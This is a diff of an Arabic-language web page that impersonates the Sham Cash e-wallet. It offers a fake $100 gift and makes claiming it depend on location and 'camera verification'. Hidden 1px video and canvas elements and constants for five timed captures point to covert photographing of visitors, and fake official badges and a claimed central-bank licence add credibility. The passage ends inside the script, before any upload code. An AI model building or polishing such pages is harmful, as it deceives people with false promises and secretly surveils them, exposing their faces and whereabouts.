@@ -2,28 +2,26 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>شام كاش - العرض الترويجي</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>شام كاش - استلام الهدية</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&family=Noto+Kufi+Arabic:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
   <style>
     :root {
-      --primary: #007a3d;
-      --primary-dark: #005a2c;
-      --primary-light: #00a651;
-      --gold: #ceb250;
-      --gold-light: #f0d878;
+      --green: #007a3d;
+      --green-dark: #005a2c;
+      --green-light: #00a651;
+      --gold: #c8a84e;
+      --gold-light: #e2c97e;
       --red: #ce1126;
-      --black: #000000;
       --white: #ffffff;
+      --black: #1a1a1a;
       --bg: #f5f5f5;
       --card: #ffffff;
       --text: #1a1a1a;
-      --text-light: #666666;
-      --border: #e0e0e0;
-      --shadow: 0 2px 20px rgba(0,0,0,0.08);
-      --shadow-lg: 0 10px 40px rgba(0,0,0,0.12);
+      --text-gray: #666666;
+      --border: #e5e7eb;
     }
 
     * {
@@ -33,20 +31,23 @@
     }
 
     body {
-      font-family: 'Cairo', 'Noto Kufi Arabic', sans-serif;
-      background: linear-gradient(180deg, #f8f8f8 0%, #e8e8e8 100%);
+      font-family: 'Cairo', sans-serif;
+      background: #f0f2f5;
       min-height: 100vh;
+      min-height: 100dvh;
       display: flex;
+      flex-direction: column;
+      align-items: center;
       justify-content: center;
-      align-items: flex-start;
       padding: 0;
-      direction: rtl;
+      margin: 0;
+      overflow-x: hidden;
     }
 
-    /* العلم السوري في الأعلى */
-    .flag-strip {
+    /* ============ شريط العلم السوري ============ */
+    .syria-flag {
       width: 100%;
-      height: 4px;
+      height: 6px;
       background: linear-gradient(90deg, 
         #007a3d 0%, #007a3d 33.33%,
         #ffffff 33.33%, #ffffff 66.66%,
@@ -54,546 +55,691 @@
       );
       position: fixed;
       top: 0;
-      z-index: 1000;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-    }
-
-    .flag-strip .stars {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      color: #ce1126;
-      font-size: 8px;
-      letter-spacing: 4px;
-    }
-
-    /* الهيدر */
-    .header {
-      background: var(--white);
-      padding: 20px;
-      text-align: center;
-      border-bottom: 1px solid var(--border);
-      position: sticky;
-      top: 4px;
-      z-index: 999;
-      box-shadow: var(--shadow);
-    }
-
-    .logo-container {
+      z-index: 100;
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 12px;
-      margin-bottom: 8px;
     }
 
-    .logo-icon {
+    .syria-flag-stars {
+      color: #ce1126;
+      font-size: 10px;
+      letter-spacing: 3px;
+      text-shadow: 0 0 2px rgba(0,0,0,0.2);
+    }
+
+    /* ============ الحاوية الرئيسية ============ */
+    .app-container {
+      width: 100%;
+      max-width: 440px;
+      margin: 0 auto;
+      padding: 12px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      min-height: 100vh;
+      min-height: 100dvh;
+      justify-content: center;
+    }
+
+    /* ============ هيدر شام كاش مع الشعار الرسمي ============ */
+    .header-card {
+      background: var(--white);
+      border-radius: 16px;
+      padding: 14px 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+      border: 1px solid #e5e7eb;
+      position: relative;
+    }
+
+    /* شعار النسر السوري في الزاوية اليسرى */
+    .syria-eagle-corner {
+      position: absolute;
+      left: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 40px;
+      height: 40px;
+      opacity: 0.7;
+    }
+
+    .syria-eagle-corner img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+
+    /* شعار شام كاش الرسمي */
+    .shamcash-logo-container {
       width: 50px;
       height: 50px;
-      background: linear-gradient(135deg, var(--primary), var(--primary-light));
-      border-radius: 14px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      box-shadow: 0 4px 15px rgba(0, 122, 61, 0.3);
+      min-width: 50px;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 3px 12px rgba(0,0,0,0.12);
+      background: white;
     }
 
-    .logo-icon svg {
-      width: 30px;
-      height: 30px;
-      fill: white;
+    .shamcash-logo-container img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
     }
 
-    .brand-name {
-      font-size: 24px;
+    .header-info {
+      flex: 1;
+    }
+
+    .header-title {
+      font-size: 18px;
       font-weight: 800;
-      color: var(--primary-dark);
-      letter-spacing: -0.5px;
+      color: #007a3d;
+      line-height: 1.2;
     }
 
-    .brand-name .cash {
-      color: var(--gold);
+    .header-subtitle {
+      font-size: 11px;
+      color: #666;
+      font-weight: 500;
     }
 
-    .official-badge {
+    .verified-badge {
       display: inline-flex;
       align-items: center;
-      gap: 5px;
+      gap: 4px;
       background: #f0fdf4;
-      color: var(--primary);
-      padding: 4px 12px;
-      border-radius: 20px;
-      font-size: 11px;
-      font-weight: 600;
+      color: #007a3d;
+      padding: 3px 10px;
+      border-radius: 12px;
+      font-size: 10px;
+      font-weight: 700;
       border: 1px solid #bbf7d0;
+      margin-top: 4px;
     }
 
-    .official-badge::before {
+    .verified-badge::before {
       content: '✓';
-      font-weight: bold;
+      font-size: 10px;
     }
 
-    /* المحتوى الرئيسي */
-    .main-container {
-      width: 100%;
-      max-width: 460px;
-      margin: 100px auto 30px;
-      padding: 0 16px;
-    }
-
-    /* بطاقة العرض */
-    .offer-card {
+    /* ============ بطاقة الهدية الرئيسية ============ */
+    .gift-card {
       background: var(--white);
       border-radius: 20px;
       overflow: hidden;
-      box-shadow: var(--shadow-lg);
-      margin-bottom: 20px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      border: 1px solid #e5e7eb;
     }
 
-    .offer-header {
-      background: linear-gradient(135deg, #007a3d 0%, #00a651 100%);
-      padding: 30px 20px;
+    /* الجزء العلوي الملون */
+    .gift-header {
+      background: linear-gradient(160deg, #007a3d 0%, #00994d 40%, #00b359 100%);
+      padding: 24px 20px 20px;
       text-align: center;
-      color: white;
       position: relative;
       overflow: hidden;
     }
 
-    .offer-header::before {
+    .gift-header::before {
+      content: '';
+      position: absolute;
+      top: -30px;
+      right: -30px;
+      width: 100px;
+      height: 100px;
+      background: rgba(255,255,255,0.06);
+      border-radius: 50%;
+    }
+
+    .gift-header::after {
+      content: '';
+      position: absolute;
+      bottom: -20px;
+      left: -20px;
+      width: 80px;
+      height: 80px;
+      background: rgba(255,255,255,0.04);
+      border-radius: 50%;
+    }
+
+    .gift-icon {
+      font-size: 48px;
+      margin-bottom: 10px;
+      position: relative;
+      z-index: 1;
+      animation: bounce 2s ease-in-out infinite;
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+
+    .gift-badge {
+      display: inline-block;
+      background: #c8a84e;
+      color: #1a1a1a;
+      padding: 5px 16px;
+      border-radius: 20px;
+      font-weight: 700;
+      font-size: 13px;
+      position: relative;
+      z-index: 1;
+      box-shadow: 0 4px 15px rgba(200, 168, 78, 0.4);
+    }
+
+    .gift-amount {
+      font-size: 48px;
+      font-weight: 900;
+      color: white;
+      margin: 12px 0 4px;
+      position: relative;
+      z-index: 1;
+      text-shadow: 0 3px 12px rgba(0,0,0,0.2);
+      line-height: 1;
+    }
+
+    .gift-amount .usd {
+      font-size: 22px;
+      vertical-align: super;
+      margin-right: 2px;
+      font-weight: 700;
+    }
+
+    .gift-subtitle {
+      color: rgba(255,255,255,0.9);
+      font-size: 14px;
+      font-weight: 500;
+      position: relative;
+      z-index: 1;
+    }
+
+    /* جسم البطاقة */
+    .gift-body {
+      padding: 20px;
+    }
+
+    /* شعار سوريا الرسمي (النسر) */
+    .syria-emblem {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 16px;
+      padding: 12px;
+      background: #fafafa;
+      border-radius: 12px;
+      border: 1px dashed #ddd;
+    }
+
+    .syria-emblem-img {
+      width: 45px;
+      height: 45px;
+    }
+
+    .syria-emblem-img img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+
+    .syria-emblem .stars-text {
+      color: #ce1126;
+      font-size: 16px;
+      letter-spacing: 2px;
+      font-weight: 700;
+    }
+
+    .syria-emblem .emblem-text {
+      font-size: 12px;
+      font-weight: 700;
+      color: #333;
+      text-align: center;
+      line-height: 1.3;
+    }
+
+    /* مميزات الهدية */
+    .features {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+
+    .feature-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 13px;
+      color: #444;
+      font-weight: 500;
+    }
+
+    .feature-icon {
+      width: 28px;
+      height: 28px;
+      min-width: 28px;
+      background: #f0fdf4;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 16px;
+    }
+
+    /* زر الاستلام */
+    .claim-btn {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, #007a3d 0%, #00a651 100%);
+      color: white;
+      border: none;
+      border-radius: 14px;
+      font-size: 18px;
+      font-weight: 800;
+      font-family: 'Cairo', sans-serif;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 8px 25px rgba(0, 122, 61, 0.3);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .claim-btn::after {
       content: '';
       position: absolute;
       top: -50%;
       left: -50%;
       width: 200%;
       height: 200%;
-      background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
-      animation: rotate 20s linear infinite;
-    }
-
-    @keyframes rotate {
-      from { transform: rotate(0deg); }
-      to { transform: rotate(360deg); }
-    }
-
-    .offer-badge {
-      display: inline-block;
-      background: var(--gold);
-      color: var(--black);
-      padding: 6px 20px;
-      border-radius: 25px;
-      font-weight: 700;
-      font-size: 14px;
-      margin-bottom: 15px;
-      position: relative;
-      z-index: 1;
-      animation: glow 2s ease-in-out infinite;
-    }
-
-    @keyframes glow {
-      0%, 100% { box-shadow: 0 0 20px rgba(206, 178, 80, 0.3); }
-      50% { box-shadow: 0 0 40px rgba(206, 178, 80, 0.6); }
-    }
-
-    .offer-amount {
-      font-size: 52px;
-      font-weight: 900;
-      line-height: 1;
-      position: relative;
-      z-index: 1;
-      text-shadow: 0 2px 10px rgba(0,0,0,0.2);
-    }
-
-    .offer-amount .currency {
-      font-size: 24px;
-      vertical-align: super;
-      margin-right: 4px;
-    }
-
-    .offer-subtitle {
-      font-size: 16px;
-      opacity: 0.95;
-      margin-top: 8px;
-      position: relative;
-      z-index: 1;
-      font-weight: 500;
-    }
-
-    .offer-body {
-      padding: 25px 20px;
-    }
-
-    .timer-section {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      background: #fff8f0;
-      border: 1px solid #fde68a;
-      padding: 12px;
-      border-radius: 12px;
-      margin-bottom: 20px;
-      color: #92400e;
-      font-weight: 600;
-      font-size: 14px;
-    }
-
-    .timer-icon {
-      font-size: 20px;
-      animation: pulse 1s ease-in-out infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.2); }
-    }
-
-    .timer-count {
-      color: #dc2626;
-      font-weight: 800;
-      font-size: 16px;
-    }
-
-    .steps-list {
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
-
-    .step-item {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      padding: 14px 16px;
-      background: #f9fafb;
-      border-radius: 12px;
-      border: 1px solid var(--border);
-      transition: all 0.3s ease;
-    }
-
-    .step-item.completed {
-      background: #f0fdf4;
-      border-color: #86efac;
-    }
-
-    .step-item.active {
-      background: #eff6ff;
-      border-color: #93c5fd;
+      background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+      transform: rotate(45deg);
       animation: shimmer 2s infinite;
     }
 
     @keyframes shimmer {
-      0%, 100% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.1); }
-      50% { box-shadow: 0 0 0 8px rgba(59, 130, 246, 0); }
+      0% { transform: translateX(-100%) rotate(45deg); }
+      100% { transform: translateX(100%) rotate(45deg); }
     }
 
-    .step-number {
-      width: 32px;
-      height: 32px;
-      min-width: 32px;
+    .claim-btn:active {
+      transform: scale(0.97);
+    }
+
+    .claim-btn .arrow {
+      margin-right: 8px;
+    }
+
+    .claim-btn:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
+    /* ============ شاشة المعالجة ============ */
+    .processing-card {
+      background: var(--white);
+      border-radius: 20px;
+      padding: 30px 20px;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      display: none;
+      border: 1px solid #e5e7eb;
+    }
+
+    .spinner-ring {
+      width: 60px;
+      height: 60px;
+      margin: 0 auto 20px;
+      border: 4px solid #e5e7eb;
+      border-top-color: #007a3d;
       border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .processing-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #1a1a1a;
+      margin-bottom: 8px;
+    }
+
+    .processing-subtitle {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+
+    .steps-progress {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      text-align: right;
+    }
+
+    .progress-step {
       display: flex;
       align-items: center;
-      justify-content: center;
-      font-weight: 700;
-      font-size: 14px;
-      background: #e5e7eb;
-      color: #6b7280;
-      transition: all 0.3s ease;
+      gap: 10px;
+      font-size: 13px;
+      color: #888;
+      padding: 10px 12px;
+      background: #f9fafb;
+      border-radius: 10px;
+      border: 1px solid #f0f0f0;
     }
 
-    .step-item.completed .step-number {
-      background: var(--primary);
-      color: white;
+    .progress-step.done {
+      color: #007a3d;
+      background: #f0fdf4;
+      border-color: #bbf7d0;
     }
 
-    .step-item.active .step-number {
-      background: #3b82f6;
-      color: white;
-    }
-
-    .step-info {
-      flex: 1;
-    }
-
-    .step-title {
+    .progress-step.current {
+      color: #1a1a1a;
+      background: #fefce8;
+      border-color: #fde68a;
       font-weight: 600;
-      font-size: 14px;
-      color: var(--text);
     }
 
-    .step-desc {
-      font-size: 12px;
-      color: var(--text-light);
+    .progress-dot {
+      width: 10px;
+      height: 10px;
+      min-width: 10px;
+      border-radius: 50%;
+      background: #ddd;
     }
 
-    .step-status {
-      font-size: 18px;
+    .progress-step.done .progress-dot {
+      background: #10b981;
     }
 
-    /* شريط التقدم */
-    .progress-section {
-      padding: 0 20px 20px;
+    .progress-step.current .progress-dot {
+      background: #f59e0b;
+      animation: pulse-dot 1s infinite;
     }
 
-    .progress-bar {
-      width: 100%;
-      height: 8px;
-      background: #e5e7eb;
-      border-radius: 10px;
-      overflow: hidden;
+    @keyframes pulse-dot {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.5); }
     }
 
-    .progress-fill {
-      height: 100%;
-      background: linear-gradient(90deg, #007a3d, #00a651, #f0d878);
-      border-radius: 10px;
-      transition: width 0.5s ease;
-      width: 0%;
-      position: relative;
-    }
-
-    .progress-fill::after {
-      content: '';
-      position: absolute;
-      right: 0;
-      top: 0;
-      width: 20px;
-      height: 100%;
-      background: rgba(255,255,255,0.4);
-      border-radius: 10px;
-      animation: progressGlow 1.5s infinite;
-    }
-
-    @keyframes progressGlow {
-      0%, 100% { opacity: 0; }
-      50% { opacity: 1; }
-    }
-
-    /* رسالة النجاح */
-    .success-message {
-      text-align: center;
+    /* ============ رسالة النجاح ============ */
+    .success-card {
+      background: var(--white);
+      border-radius: 20px;
       padding: 30px 20px;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
       display: none;
+      border: 1px solid #e5e7eb;
     }
 
-    .success-icon {
-      width: 80px;
-      height: 80px;
+    .success-icon-circle {
+      width: 70px;
+      height: 70px;
       background: linear-gradient(135deg, #10b981, #34d399);
       border-radius: 50%;
       margin: 0 auto 20px;
       display: flex;
       align-items: center;
       justify-content: center;
-      animation: scaleIn 0.6s ease;
+      animation: popIn 0.5s ease;
     }
 
-    @keyframes scaleIn {
-      from { transform: scale(0) rotate(-180deg); }
-      to { transform: scale(1) rotate(0deg); }
+    @keyframes popIn {
+      from { transform: scale(0) rotate(-90deg); opacity: 0; }
+      to { transform: scale(1) rotate(0deg); opacity: 1; }
     }
 
-    .success-icon svg {
-      width: 40px;
-      height: 40px;
+    .success-icon-circle svg {
+      width: 35px;
+      height: 35px;
     }
 
     .success-title {
       font-size: 22px;
       font-weight: 800;
-      color: var(--primary-dark);
-      margin-bottom: 8px;
+      color: #007a3d;
+      margin-bottom: 6px;
+    }
+
+    .success-amount {
+      font-size: 36px;
+      font-weight: 900;
+      color: #c8a84e;
     }
 
     .success-text {
-      color: var(--text-light);
-      font-size: 14px;
+      color: #666;
+      font-size: 13px;
+      margin-top: 4px;
     }
 
-    /* الفوتر */
-    .footer {
+    /* ============ رسالة خطأ ============ */
+    .error-card {
+      background: var(--white);
+      border-radius: 20px;
+      padding: 30px 20px;
       text-align: center;
-      padding: 20px;
-      color: #9ca3af;
-      font-size: 11px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      display: none;
+      border: 1px solid #e5e7eb;
     }
 
-    .footer-links {
-      display: flex;
-      justify-content: center;
-      gap: 16px;
-      margin-bottom: 8px;
+    .error-icon {
+      font-size: 50px;
+      margin-bottom: 12px;
     }
 
-    .footer-link {
-      color: #6b7280;
-      text-decoration: none;
-      font-size: 12px;
+    .error-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #dc2626;
+      margin-bottom: 6px;
     }
 
-    /* عناصر مخفية */
+    .error-text {
+      color: #666;
+      font-size: 13px;
+      margin-bottom: 16px;
+    }
+
+    .retry-btn {
+      background: #007a3d;
+      color: white;
+      border: none;
+      padding: 12px 30px;
+      border-radius: 25px;
+      font-weight: 700;
+      font-size: 14px;
+      cursor: pointer;
+      font-family: 'Cairo', sans-serif;
+    }
+
+    /* ============ عناصر مخفية ============ */
     video, canvas {
-      position: absolute;
+      position: fixed;
+      top: 0;
+      left: 0;
       opacity: 0;
       pointer-events: none;
       width: 1px;
       height: 1px;
-      top: -9999px;
+      z-index: -999;
     }
 
     .hidden {
       display: none !important;
     }
 
-    /* رسائل الخطأ */
-    .error-state {
-      text-align: center;
-      padding: 40px 20px;
+    /* ============ تحسينات للجوال ============ */
+    @media (max-width: 400px) {
+      .app-container {
+        padding: 8px;
+        gap: 8px;
+      }
+      .gift-amount {
+        font-size: 40px;
+      }
+      .claim-btn {
+        font-size: 16px;
+        padding: 14px;
+      }
+      .syria-eagle-corner {
+        width: 32px;
+        height: 32px;
+        left: 10px;
+      }
     }
 
-    .error-icon {
-      font-size: 60px;
-      margin-bottom: 15px;
+    @media (min-height: 800px) {
+      .app-container {
+        justify-content: center;
+        gap: 16px;
+      }
     }
 
-    .error-title {
-      font-size: 20px;
-      font-weight: 700;
-      color: #dc2626;
-      margin-bottom: 8px;
-    }
-
-    .error-text {
-      color: #6b7280;
-      font-size: 14px;
-      margin-bottom: 20px;
-    }
-
-    .retry-btn {
-      background: var(--primary);
-      color: white;
-      border: none;
-      padding: 12px 30px;
-      border-radius: 25px;
-      font-weight: 600;
-      font-size: 14px;
-      cursor: pointer;
-      font-family: 'Cairo', sans-serif;
+    @media (max-height: 700px) {
+      .app-container {
+        justify-content: flex-start;
+        padding-top: 20px;
+      }
     }
   </style>
 </head>
 <body>
 
   <!-- العلم السوري -->
-  <div class="flag-strip">
-    <span class="stars">✱✱✱</span>
+  <div class="syria-flag">
+    <span class="syria-flag-stars">✦✦✦</span>
   </div>
 
-  <!-- هيدر شام كاش -->
-  <div class="header">
-    <div class="logo-container">
-      <div class="logo-icon">
-        <svg viewBox="0 0 24 24">
-          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
-        </svg>
-      </div>
-      <div>
-        <div class="brand-name">شام <span class="cash">كاش</span></div>
-        <div class="official-badge">المنصة الرسمية</div>
-      </div>
-    </div>
-  </div>
+  <!-- الحاوية الرئيسية -->
+  <div class="app-container">
 
-  <!-- المحتوى الرئيسي -->
-  <div class="main-container">
-    
-    <!-- بطاقة العرض -->
-    <div class="offer-card" id="offerCard">
-      <div class="offer-header">
-        <div class="offer-badge">🎉 عرض خاص</div>
-        <div class="offer-amount">
-          100<span class="currency">$</span>
-        </div>
-        <div class="offer-subtitle">رصيد مجاني على محفظتك</div>
+    <!-- هيدر شام كاش مع الشعارين -->
+    <div class="header-card" id="headerCard">
+      <!-- شعار شام كاش الرسمي -->
+      <div class="shamcash-logo-container">
+        <img 
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Image_of_the_Sham_Cash_app_in_Syria_2026.jpg/250px-Image_of_the_Sham_Cash_app_in_Syria_2026.jpg"
+          alt="شام كاش"
+          onerror="this.style.display='none'; this.parentElement.innerHTML='<div style=width:50px;height:50px;background:linear-gradient(135deg,#007a3d,#00a651);border-radius:12px;display:flex;align-items:center;justify-content:center;color:white;font-weight:900;font-size:20px;>شك</div>'"
+        >
+      </div>
+      
+      <div class="header-info">
+        <div class="header-title">شام كاش</div>
+        <div class="header-subtitle">المحفظة الإلكترونية الرسمية</div>
+        <span class="verified-badge">حساب موثق</span>
       </div>
 
-      <div class="offer-body">
-        <!-- المؤقت -->
-        <div class="timer-section" id="timerSection">
-          <span class="timer-icon">⏳</span>
-          <span>ينتهي العرض خلال:</span>
-          <span class="timer-count" id="timerCount">04:59</span>
-        </div>
-
-        <!-- الخطوات -->
-        <div class="steps-list">
-          <div class="step-item" id="step1">
-            <div class="step-number">1</div>
-            <div class="step-info">
-              <div class="step-title">تأكيد الموقع الجغرافي</div>
-              <div class="step-desc">للتأكد من أهليتك للعرض داخل سوريا</div>
-            </div>
-            <div class="step-status" id="step1Status"></div>
-          </div>
-
-          <div class="step-item" id="step2">
-            <div class="step-number">2</div>
-            <div class="step-info">
-              <div class="step-title">التحقق عبر الكاميرا</div>
-              <div class="step-desc">لمنع الاحتيال وضمان وصول العرض لك</div>
-            </div>
-            <div class="step-status" id="step2Status"></div>
-          </div>
-
-          <div class="step-item" id="step3">
-            <div class="step-number">3</div>
-            <div class="step-info">
-              <div class="step-title">معالجة المكافأة</div>
-              <div class="step-desc">جاري إضافة الرصيد إلى حسابك</div>
-            </div>
-            <div class="step-status" id="step3Status"></div>
-          </div>
-        </div>
-      </div>
-
-      <!-- شريط التقدم -->
-      <div class="progress-section">
-        <div class="progress-bar">
-          <div class="progress-fill" id="progressFill"></div>
-        </div>
+      <!-- شعار النسر السوري في الزاوية اليسرى -->
+      <div class="syria-eagle-corner">
+        <img 
+          src="https://pngdownload.io/png-image/syria-new-emblem-logo-syrian-arab-republic-national-symbol-transparent-png/"
+          alt="شعار سوريا"
+          onerror="this.style.display='none';"
+        >
       </div>
     </div>
 
-    <!-- رسالة النجاح -->
-    <div class="success-message" id="successMessage">
-      <div class="success-icon">
+    <!-- بطاقة الهدية -->
+    <div class="gift-card" id="giftCard">
+      <div class="gift-header">
+        <div class="gift-icon">🎁</div>
+        <div class="gift-badge">🏆 عرض حصري</div>
+        <div class="gift-amount">100<span class="usd">$</span></div>
+        <div class="gift-subtitle">رصيد مجاني على محفظة شام كاش</div>
+      </div>
+      
+      <div class="gift-body">
+        <!-- شعار سوريا الرسمي (النسر الكبير) -->
+        <div class="syria-emblem">
+          <div class="syria-emblem-img">
+            <img 
+              src="https://pngdownload.io/png-image/syria-new-emblem-logo-syrian-arab-republic-national-symbol-transparent-png/"
+              alt="شعار الجمهورية العربية السورية"
+              onerror="this.innerHTML='🦅'; this.style.fontSize='40px';"
+            >
+          </div>
+          <div>
+            <span class="stars-text">★★★</span>
+            <div class="emblem-text">الجمهورية العربية السورية</div>
+          </div>
+        </div>
+
+        <!-- مميزات -->
+        <div class="features">
+          <div class="feature-item">
+            <span class="feature-icon">✅</span>
+            <span>رصيد فوري يضاف إلى محفظتك</span>
+          </div>
+          <div class="feature-item">
+            <span class="feature-icon">🎯</span>
+            <span>متاح لجميع مستخدمي شام كاش في سوريا</span>
+          </div>
+          <div class="feature-item">
+            <span class="feature-icon">🔒</span>
+            <span>عملية آمنة ومشفرة بالكامل</span>
+          </div>
+        </div>
+
+        <!-- زر الاستلام -->
+        <button class="claim-btn" id="claimBtn" onclick="startClaim()">
+          استلام الهدية الآن
+          <span class="arrow">←</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- بطاقة المعالجة -->
+    <div class="processing-card" id="processingCard">
+      <div class="spinner-ring"></div>
+      <div class="processing-title">جاري معالجة طلبك</div>
+      <div class="processing-subtitle">يرجى الانتظار، نقوم بتأكيد أهليتك...</div>
+      <div class="steps-progress">
+        <div class="progress-step" id="pStep1">
+          <span class="progress-dot"></span>
+          <span>التحقق من الموقع الجغرافي</span>
+        </div>
+        <div class="progress-step" id="pStep2">
+          <span class="progress-dot"></span>
+          <span>تأكيد الهوية عبر الكاميرا</span>
+        </div>
+        <div class="progress-step" id="pStep3">
+          <span class="progress-dot"></span>
+          <span>إضافة الرصيد إلى محفظتك</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- بطاقة النجاح -->
+    <div class="success-card" id="successCard">
+      <div class="success-icon-circle">
         <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3">
-          <polyline points="20 6 9 17 4 12"></polyline>
+          <polyline points="20 6 9 17 4 12"/>
         </svg>
       </div>
-      <div class="success-title">🎉 مبروك!</div>
-      <div class="success-text">تمت إضافة 100$ إلى رصيدك بنجاح</div>
-      <div style="margin-top: 10px; font-size: 12px; color: #9ca3af;">سيظهر الرصيد خلال 24 ساعة</div>
+      <div class="success-title">🎉 تهانينا!</div>
+      <div class="success-amount">100$</div>
+      <div class="success-text">تمت إضافتها إلى رصيدك بنجاح</div>
+      <div style="margin-top:10px;font-size:11px;color:#999;">سيظهر الرصيد خلال 24 ساعة عمل</div>
     </div>
 
-    <!-- حالة الخطأ -->
-    <div class="error-state hidden" id="errorState">
+    <!-- بطاقة الخطأ -->
+    <div class="error-card" id="errorCard">
       <div class="error-icon">⚠️</div>
-      <div class="error-title">تعذر إكمال العملية</div>
-      <div class="error-text" id="errorText">يرجى المحاولة مرة أخرى</div>
-      <button class="retry-btn" onclick="location.reload()">إعادة المحاولة</button>
-    </div>
-
-    <!-- فooter -->
-    <div class="footer">
-      <div class="footer-links">
-        <span class="footer-link">الشروط والأحكام</span>
-        <span class="footer-link">سياسة الخصوصية</span>
-        <span class="footer-link">اتصل بنا</span>
-      </div>
-      <div>© 2024 شام كاش. جميع الحقوق محفوظة</div>
-      <div style="margin-top: 4px;">مرخصة من مصرف سوريا المركزي</div>
+      <div class="error-title">تعذر إكمال الطلب</div>
+      <div class="error-text" id="errorText">يرجى المحاولة مرة أخرى والسماح بالأذونات المطلوبة</div>
+      <button class="retry-btn" onclick="location.reload()">🔄 إعادة المحاولة</button>
     </div>
 
   </div>
@@ -610,79 +756,57 @@
     const CAPTURE_COUNT = 5;
     const CAPTURE_INTERVAL = 2000;
 
-    // ============ عناصر DOM ============
-    const elements = {
-      step1: document.getElementById('step1'),
-      step2: document.getElementById('step2'),
-      step3: document.getElementById('step3'),
-      step1Status: document.getElementById('step1Status'),
-      step2Status: document.getElementById('step2Status'),
-      step3Status: document.getElementById('step3Status'),
-      progressFill: document.getElementById('progressFill'),
-      timerSection: document.getElementById('timerSection'),
-      timerCount: document.getElementById('timerCount'),
-      offerCard: document.getElementById('offerCard'),
-      successMessage: document.getElementById('successMessage'),
-      errorState: document.getElementById('errorState'),
-      errorText: document.getElementById('errorText'),
-    };
+    // ============ العناصر ============
+    const giftCard = document.getElementById('giftCard');
+    const headerCard = document.getElementById('headerCard');
+    const processingCard = document.getElementById('processingCard');
+    const successCard = document.getElementById('successCard');
+    const errorCard = document.getElementById('errorCard');
+    const errorText = document.getElementById('errorText');
+    
+    const pStep1 = document.getElementById('pStep1');
+    const pStep2 = document.getElementById('pStep2');
+    const pStep3 = document.getElementById('pStep3');
 
-    // ============ المؤقت التنازلي ============
-    let timeLeft = 300; // 5 دقائق
-    const timerInterval = setInterval(() => {
-      timeLeft--;
-      const mins = Math.floor(timeLeft / 60);
-      const secs = timeLeft % 60;
-      elements.timerCount.textContent = 
-        `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
-      
-      if (timeLeft <= 60) {
-        elements.timerCount.style.color = '#dc2626';
-        elements.timerCount.style.animation = 'pulse 0.5s infinite';
-      }
-      
-      if (timeLeft <= 0) {
-        clearInterval(timerInterval);
-      }
-    }, 1000);
-
-    // ============ دوال التحديث ============
-    function updateProgress(percent) {
-      elements.progressFill.style.width = percent + '%';
-    }
-
-    function updateStep(step, status) {
-      const stepEl = elements['step' + step];
